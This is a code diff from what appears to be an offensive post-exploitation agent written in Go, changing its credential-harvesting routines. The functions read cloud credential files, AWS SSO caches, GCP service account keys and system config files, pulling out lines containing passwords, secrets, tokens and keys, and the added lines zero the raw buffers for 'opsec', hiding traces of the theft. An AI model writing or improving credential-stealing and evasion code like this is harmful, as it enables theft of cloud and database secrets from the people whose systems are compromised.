@@ -188,6 +188,7 @@ func credCloud(args credHarvestArgs) structs.CommandResult {
 				if info.Size() < 10240 && info.Size() > 0 {
 					if data, err := os.ReadFile(path); err == nil {
 						content := string(data)
+						structs.ZeroBytes(data) // opsec: clear raw credential file data
 						if len(content) > 2000 {
 							content = content[:2000] + "\n... (truncated)"
 						}
@@ -287,6 +288,7 @@ func credCloudAWSCache(sb *strings.Builder, homes []string) {
 						if info.Size() < 4096 && info.Size() > 0 {
 							if data, err := os.ReadFile(path); err == nil {
 								content := string(data)
+								structs.ZeroBytes(data) // opsec: clear raw SSO cache data
 								if len(content) > 500 {
 									content = content[:500] + "..."
 								}
@@ -342,6 +344,7 @@ func credCloudGCPServiceAccounts(sb *strings.Builder, homes []string) {
 							if info.Size() < 4096 && info.Size() > 0 {
 								if data, err := os.ReadFile(path); err == nil {
 									content := string(data)
+									structs.ZeroBytes(data) // opsec: clear raw GCP service account key data
 									if len(content) > 1000 {
 										content = content[:1000] + "..."
 									}
@@ -461,6 +464,7 @@ func credConfigs(args credHarvestArgs) structs.CommandResult {
 				if info.Size() < 4096 && info.Size() > 0 {
 					if data, err := os.ReadFile(path); err == nil {
 						content := string(data)
+						structs.ZeroBytes(data) // opsec: clear raw config file data
 						if len(content) > 1000 {
 							content = content[:1000] + "\n... (truncated)"
 						}
@@ -490,7 +494,9 @@ func credConfigs(args credHarvestArgs) structs.CommandResult {
 					sb.WriteString(fmt.Sprintf("  [SYSTEM] %s (%d bytes)\n", path, info.Size()))
 					if info.Size() < 4096 && info.Size() > 0 {
 						if data, err := os.ReadFile(path); err == nil {
-							for _, line := range strings.Split(string(data), "\n") {
+							lines := strings.Split(string(data), "\n")
+							structs.ZeroBytes(data) // opsec: clear raw database config data
+							for _, line := range lines {
 								lower := strings.ToLower(line)
 								if strings.Contains(lower, "password") || strings.Contains(lower, "secret") || strings.Contains(lower, "token") || strings.Contains(lower, "key") {
 									sb.WriteString(fmt.Sprintf("    %s\n", strings.TrimSpace(line)))
